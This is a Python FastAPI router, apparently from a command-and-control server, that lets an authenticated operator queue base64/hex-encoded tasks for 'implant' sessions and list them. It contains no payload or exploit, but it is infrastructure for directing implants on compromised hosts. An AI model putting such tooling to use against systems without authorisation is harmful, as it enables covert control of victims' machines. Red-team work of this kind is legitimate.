import base64
import binascii
from datetime import datetime, timezone
from typing import List

from fastapi import APIRouter, HTTPException, Depends, Security

from server.server_helper.auth_helper import oauth2_scheme, verify_token
from server.server_helper.db import get_db, SessionLocal
from server.server_helper.implant_helper import Implant
from server.server_helper.tasking_helper import Tasking, TaskingCreate, TaskingRead

router = APIRouter(prefix="/tasking", tags=["tasking"])

# PROTECTED endpoint in order to create a task for an implant (client -> server)
@router.post("/{session}", response_model=TaskingCreate)
def create_tasking(
    session: str,
    tasking: TaskingCreate,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    The endpoint where merchant will submit tasking requests to lighthouse for the agent to pick up and action
    :param session: The session id we should associate with for the tasking request
    :param tasking: The json blob containing the valid tasking request
    :param db: The active database connection
    :param token: The token used to authenticate a merchant to lighthouse
    :return db_task: The json tasking information, 404 if the session is not found, 400 if the
    arguments are not valid for the tasking request
    """
    verify_token(token)
    current_time = datetime.now(timezone.utc).isoformat()
    # Check if the session exists
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    # Decode the arguments from base64(hex) if provided
    if tasking.args:
        try:
            args_bytes = bytes.fromhex(tasking.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    # Dump model data excluding fields that will be manually set
    tasking_data = tasking.model_dump(exclude={"session", "complete", "date"})
    # Override 'args' with decoded version
    tasking_data["args"] = decoded_args
    # Create new task
    db_task = Tasking(
        **tasking_data, session=session, date=current_time, complete="False"
    )
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return db_task


# PROTECTED endpoint for client to retrieve taskings
@router.get("/{session}", response_model=List[TaskingRead])
def read_taskings(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")

    tasking = (
        db.query(Tasking)
        .filter(
            Tasking.session == session,
            Tasking.complete.in_(["False", "Pending", "True"]),
        )
        .all()
    )
    return tasking


